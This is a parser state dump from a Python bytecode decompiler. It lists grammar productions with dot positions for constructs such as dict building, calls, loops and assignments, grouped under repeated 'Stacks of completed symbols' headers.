const_list ::= COLLECTION_START \e_add_consts . BUILD_CONST_DICT
const_list ::= COLLECTION_START add_consts . BUILD_CONST_DICT
const_list ::= COLLECTION_START add_consts BUILD_CONST_DICT . 
continues ::= _stmts . lastl_stmt continue
dict ::= const_list . 
dict ::= expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr . expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_2
dict ::= expr expr LOAD_CONST BUILD_CONST_KEY_MAP_2 . 
dict ::= expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4 . 
dict ::= expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr expr expr . expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr . expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6 . 
dict ::= expr expr expr expr expr expr expr . expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr . expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr . expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr . expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr . expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr . expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr expr . expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr expr expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15 . 
dict ::= kvlist_0 . 
expr ::= LOAD_CONST . 
expr ::= LOAD_FAST . 
expr ::= LOAD_GLOBAL . 
expr ::= LOAD_STR . 
expr ::= attribute . 
expr ::= bin_op . 
expr ::= call_kw36 . 
expr ::= dict . 
expr_jit ::= expr . JUMP_IF_TRUE
expr_jitop ::= expr . JUMP_IF_TRUE_OR_POP
expr_jt ::= expr . jmp_true
expr_pjit ::= expr . POP_JUMP_IF_TRUE
expr_pjit_come_from ::= expr . POP_JUMP_IF_TRUE COME_FROM
expr_stmt ::= expr . POP_TOP
expr_stmt ::= expr POP_TOP . 
for38 ::= expr . get_for_iter store for_block
for38 ::= expr . get_for_iter store for_block JUMP_BACK
for38 ::= expr . get_for_iter store for_block JUMP_BACK POP_BLOCK
for38 ::= expr . get_iter store for_block JUMP_BACK
forelselaststmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitec
forelselaststmtl38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitel
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suite
formatted_value1 ::= expr . FORMAT_VALUE
formatted_value_debug ::= LOAD_STR . formatted_value1 BUILD_STRING_2
formatted_value_debug ::= LOAD_STR . formatted_value2 BUILD_STRING_2
get_iter ::= expr . GET_ITER
if_exp ::= expr . jmp_false expr jf_cf expr COME_FROM
if_exp ::= expr . jmp_false expr jump_absolute_else expr
if_exp37 ::= expr . expr jf_cfs expr COME_FROM
if_exp37 ::= expr expr . jf_cfs expr COME_FROM
if_exp_37b ::= expr . jmp_false expr POP_JUMP_IF_FALSE jump_forward_else expr
if_exp_lambda ::= expr . jmp_false expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_not ::= expr . jmp_true expr jump_forward_else expr COME_FROM
if_exp_not_lambda ::= expr . jmp_true expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_true ::= expr . JUMP_FORWARD expr COME_FROM
joined_str ::= expr . expr BUILD_STRING_2
joined_str ::= expr expr . BUILD_STRING_2
kvlist_0 ::= BUILD_MAP_0 . 
kvlist_1 ::= expr . expr BUILD_MAP_1
kvlist_1 ::= expr expr . BUILD_MAP_1
l_stmts ::= _stmts . 
l_stmts ::= _stmts . lastl_stmt
l_stmts ::= l_stmts . lstmt
l_stmts ::= lstmt . 
lambda_body ::= expr . LOAD_LAMBDA LOAD_STR MAKE_FUNCTION_4
lstmt ::= stmt . 
mkfunc ::= expr . LOAD_CODE LOAD_STR MAKE_FUNCTION_4
mkfuncdeco ::= expr . mkfuncdeco CALL_FUNCTION_1
mkfuncdeco ::= expr . mkfuncdeco0 CALL_FUNCTION_1
named_expr ::= expr . DUP_TOP store
pop_ex_return ::= return_expr . ROT_FOUR POP_EXCEPT RETURN_VALUE
popb_return ::= return_expr . POP_BLOCK RETURN_VALUE
pos_arg ::= expr . 
ret_and ::= expr . JUMP_IF_FALSE_OR_POP return_expr_or_cond COME_FROM
ret_or ::= expr . JUMP_IF_TRUE_OR_POP return_expr_or_cond COME_FROM
return ::= return_expr . RETURN_END_IF
return ::= return_expr . RETURN_VALUE
return ::= return_expr . RETURN_VALUE COME_FROM
return ::= return_expr . discard_tops RETURN_VALUE
return_expr ::= expr . 
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA LAMBDA_MARKER
returns ::= _stmts . return
returns ::= _stmts . return_if_stmt
sstmt ::= sstmt . RETURN_LAST
sstmt ::= stmt . 
stmt ::= call_stmt . 
stmt ::= expr_stmt . 
stmts ::= sstmt . 
stmts ::= stmts . sstmt
store ::= expr . STORE_ATTR
store_subscript ::= expr . expr STORE_SUBSCR
store_subscript ::= expr expr . STORE_SUBSCR
subscript ::= expr . expr BINARY_SUBSCR
subscript ::= expr expr . BINARY_SUBSCR
subscript2 ::= expr . expr DUP_TOP_TWO BINARY_SUBSCR
subscript2 ::= expr expr . DUP_TOP_TWO BINARY_SUBSCR
testfalse ::= expr . jmp_false
testfalse_not_and ::= expr . jmp_false expr jmp_true COME_FROM
testfalse_not_or ::= expr . jmp_false expr jmp_false COME_FROM
testfalsel ::= expr . jmp_true
testtrue ::= expr . jmp_true
tuple ::= expr . expr BUILD_TUPLE_2
tuple ::= expr expr . BUILD_TUPLE_2
unary_not ::= expr . UNARY_NOT
unary_op ::= expr . unary_operator
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
while1stmt ::= \e__come_froms l_stmts . COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt ::= \e__come_froms l_stmts . JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
yield ::= expr . YIELD_VALUE
yield_from ::= expr . GET_YIELD_FROM_ITER LOAD_CONST YIELD_FROM

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
and ::= expr . JUMP_IF_FALSE_OR_POP expr \e_come_from_opt
and ::= expr . JUMP_IF_FALSE_OR_POP expr come_from_opt
and ::= expr . jifop_come_from expr
and ::= expr . jmp_false expr
and ::= expr . jmp_false expr COME_FROM
and ::= expr . jmp_false expr jmp_false
and_not ::= expr . jmp_false expr POP_JUMP_IF_TRUE
assert2 ::= expr . jmp_true LOAD_GLOBAL expr CALL_FUNCTION_1 RAISE_VARARGS_1
assign ::= expr . DUP_TOP designList
assign ::= expr . store
assign2 ::= expr . expr ROT_TWO store store
assign2 ::= expr expr . ROT_TWO store store
assign3 ::= expr . expr expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr . expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr expr . ROT_THREE ROT_TWO store store store
async_for_stmt38 ::= expr . async_for store for_block COME_FROM_FINALLY END_ASYNC_FOR
async_forelse_stmt38 ::= expr . GET_AITER SETUP_FINALLY GET_ANEXT LOAD_CONST YIELD_FROM POP_BLOCK store for_block COME_FROM_FINALLY END_ASYNC_FOR else_suite
attribute ::= expr . LOAD_ATTR
attribute ::= expr LOAD_ATTR . 
attribute37 ::= expr . LOAD_METHOD
aug_assign1 ::= expr . expr inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr . expr inplace_op store
aug_assign1 ::= expr expr . inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr expr . inplace_op store
aug_assign2 ::= expr . DUP_TOP LOAD_ATTR expr inplace_op ROT_TWO STORE_ATTR
await_expr ::= expr . GET_AWAITABLE LOAD_CONST YIELD_FROM
bin_op ::= expr . expr binary_operator
bin_op ::= expr expr . binary_operator
call ::= expr . CALL_FUNCTION_0
call ::= expr . CALL_METHOD_0
call ::= expr . expr CALL_METHOD_1
call ::= expr . pos_arg CALL_FUNCTION_1
call ::= expr . pos_arg pos_arg CALL_FUNCTION_2
call ::= expr expr . CALL_METHOD_1
call ::= expr pos_arg . CALL_FUNCTION_1
call ::= expr pos_arg . pos_arg CALL_FUNCTION_2
call ::= expr pos_arg pos_arg . CALL_FUNCTION_2
call_kw36 ::= expr . expr LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr . expr expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr . expr expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr . LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr expr . expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr . expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr . LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr . expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr . LOAD_CONST CALL_FUNCTION_KW_3
call_stmt ::= expr . POP_TOP
classdefdeco1 ::= expr . classdefdeco1 CALL_FUNCTION_1
classdefdeco1 ::= expr . classdefdeco2 CALL_FUNCTION_1
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP \e__come_froms
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP _come_froms
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained1 COME_FROM
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained2 COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2c_37 POP_TOP JUMP_FORWARD COME_FROM
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 COME_FROM POP_TOP COME_FROM
compare_chained1b_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1c_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 POP_TOP
compare_chained2_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_false_37 POP_TOP JUMP_BACK COME_FROM
compare_chained37 ::= expr . compare_chained1a_37
compare_chained37 ::= expr . compare_chained1c_37
compare_chained37_false ::= expr . compare_chained1_false_37
compare_chained37_false ::= expr . compare_chained1b_false_37
compare_chained37_false ::= expr . compare_chained2_false_37
compare_single ::= expr . expr COMPARE_OP
compare_single ::= expr expr . COMPARE_OP
dict ::= expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr . expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= kvlist_0 . 
expr ::= LOAD_GLOBAL . 
expr ::= LOAD_STR . 
expr ::= attribute . 
expr ::= dict . 
expr_jit ::= expr . JUMP_IF_TRUE
expr_jitop ::= expr . JUMP_IF_TRUE_OR_POP
expr_jt ::= expr . jmp_true
expr_pjit ::= expr . POP_JUMP_IF_TRUE
expr_pjit_come_from ::= expr . POP_JUMP_IF_TRUE COME_FROM
expr_stmt ::= expr . POP_TOP
for38 ::= expr . get_for_iter store for_block
for38 ::= expr . get_for_iter store for_block JUMP_BACK
for38 ::= expr . get_for_iter store for_block JUMP_BACK POP_BLOCK
for38 ::= expr . get_iter store for_block JUMP_BACK
forelselaststmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitec
forelselaststmtl38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitel
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suite
formatted_value1 ::= expr . FORMAT_VALUE
formatted_value_debug ::= LOAD_STR . formatted_value1 BUILD_STRING_2
formatted_value_debug ::= LOAD_STR . formatted_value2 BUILD_STRING_2
get_iter ::= expr . GET_ITER
if_exp ::= expr . jmp_false expr jf_cf expr COME_FROM
if_exp ::= expr . jmp_false expr jump_absolute_else expr
if_exp37 ::= expr . expr jf_cfs expr COME_FROM
if_exp37 ::= expr expr . jf_cfs expr COME_FROM
if_exp_37b ::= expr . jmp_false expr POP_JUMP_IF_FALSE jump_forward_else expr
if_exp_lambda ::= expr . jmp_false expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_not ::= expr . jmp_true expr jump_forward_else expr COME_FROM
if_exp_not_lambda ::= expr . jmp_true expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_true ::= expr . JUMP_FORWARD expr COME_FROM
joined_str ::= expr . expr BUILD_STRING_2
joined_str ::= expr expr . BUILD_STRING_2
kvlist_0 ::= BUILD_MAP_0 . 
kvlist_1 ::= expr . expr BUILD_MAP_1
kvlist_1 ::= expr expr . BUILD_MAP_1
lambda_body ::= expr . LOAD_LAMBDA LOAD_STR MAKE_FUNCTION_4
mkfunc ::= expr . LOAD_CODE LOAD_STR MAKE_FUNCTION_4
mkfuncdeco ::= expr . mkfuncdeco CALL_FUNCTION_1
mkfuncdeco ::= expr . mkfuncdeco0 CALL_FUNCTION_1
named_expr ::= expr . DUP_TOP store
pop_ex_return ::= return_expr . ROT_FOUR POP_EXCEPT RETURN_VALUE
popb_return ::= return_expr . POP_BLOCK RETURN_VALUE
pos_arg ::= expr . 
ret_and ::= expr . JUMP_IF_FALSE_OR_POP return_expr_or_cond COME_FROM
ret_or ::= expr . JUMP_IF_TRUE_OR_POP return_expr_or_cond COME_FROM
return ::= return_expr . RETURN_END_IF
return ::= return_expr . RETURN_VALUE
return ::= return_expr . RETURN_VALUE COME_FROM
return ::= return_expr . discard_tops RETURN_VALUE
return_expr ::= expr . 
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA LAMBDA_MARKER
store ::= expr . STORE_ATTR
store_subscript ::= expr . expr STORE_SUBSCR
store_subscript ::= expr expr . STORE_SUBSCR
subscript ::= expr . expr BINARY_SUBSCR
subscript ::= expr expr . BINARY_SUBSCR
subscript2 ::= expr . expr DUP_TOP_TWO BINARY_SUBSCR
subscript2 ::= expr expr . DUP_TOP_TWO BINARY_SUBSCR
testfalse ::= expr . jmp_false
testfalse_not_and ::= expr . jmp_false expr jmp_true COME_FROM
testfalse_not_or ::= expr . jmp_false expr jmp_false COME_FROM
testfalsel ::= expr . jmp_true
testtrue ::= expr . jmp_true
tuple ::= expr . expr BUILD_TUPLE_2
tuple ::= expr expr . BUILD_TUPLE_2
unary_not ::= expr . UNARY_NOT
unary_op ::= expr . unary_operator
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
yield ::= expr . YIELD_VALUE
yield_from ::= expr . GET_YIELD_FROM_ITER LOAD_CONST YIELD_FROM

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
_stmts ::= _stmts . stmt
_stmts ::= stmt . 
add_consts ::= \e_add_consts . ADD_VALUE
add_consts ::= \e_add_consts ADD_VALUE . 
add_consts ::= add_consts . ADD_VALUE
add_consts ::= add_consts ADD_VALUE . 
and ::= expr . JUMP_IF_FALSE_OR_POP expr \e_come_from_opt
and ::= expr . JUMP_IF_FALSE_OR_POP expr come_from_opt
and ::= expr . jifop_come_from expr
and ::= expr . jmp_false expr
and ::= expr . jmp_false expr COME_FROM
and ::= expr . jmp_false expr jmp_false
and_not ::= expr . jmp_false expr POP_JUMP_IF_TRUE
assert2 ::= expr . jmp_true LOAD_GLOBAL expr CALL_FUNCTION_1 RAISE_VARARGS_1
assign ::= expr . DUP_TOP designList
assign ::= expr . store
assign2 ::= expr . expr ROT_TWO store store
assign2 ::= expr expr . ROT_TWO store store
assign3 ::= expr . expr expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr . expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr expr . ROT_THREE ROT_TWO store store store
async_for_stmt38 ::= expr . async_for store for_block COME_FROM_FINALLY END_ASYNC_FOR
async_forelse_stmt38 ::= expr . GET_AITER SETUP_FINALLY GET_ANEXT LOAD_CONST YIELD_FROM POP_BLOCK store for_block COME_FROM_FINALLY END_ASYNC_FOR else_suite
attribute ::= expr . LOAD_ATTR
attribute ::= expr LOAD_ATTR . 
attribute37 ::= expr . LOAD_METHOD
attribute37 ::= expr LOAD_METHOD . 
aug_assign1 ::= expr . expr inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr . expr inplace_op store
aug_assign1 ::= expr expr . inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr expr . inplace_op store
aug_assign2 ::= expr . DUP_TOP LOAD_ATTR expr inplace_op ROT_TWO STORE_ATTR
await_expr ::= expr . GET_AWAITABLE LOAD_CONST YIELD_FROM
bin_op ::= expr . expr binary_operator
bin_op ::= expr expr . binary_operator
call ::= expr . CALL_FUNCTION_0
call ::= expr . CALL_METHOD_0
call ::= expr . expr CALL_METHOD_1
call ::= expr . pos_arg CALL_FUNCTION_1
call ::= expr . pos_arg pos_arg CALL_FUNCTION_2
call ::= expr expr . CALL_METHOD_1
call ::= expr expr CALL_METHOD_1 . 
call ::= expr pos_arg . CALL_FUNCTION_1
call ::= expr pos_arg . pos_arg CALL_FUNCTION_2
call ::= expr pos_arg pos_arg . CALL_FUNCTION_2
call_kw36 ::= expr . expr LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr . expr expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr . expr expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr . LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr expr . expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr . expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr LOAD_CONST . CALL_FUNCTION_KW_1
call_kw36 ::= expr expr expr . LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr . expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr LOAD_CONST . CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr expr . LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr LOAD_CONST . CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr LOAD_CONST CALL_FUNCTION_KW_3 . 
call_stmt ::= call . 
call_stmt ::= expr . POP_TOP
call_stmt ::= expr POP_TOP . 
classdefdeco1 ::= expr . classdefdeco1 CALL_FUNCTION_1
classdefdeco1 ::= expr . classdefdeco2 CALL_FUNCTION_1
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP \e__come_froms
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP _come_froms
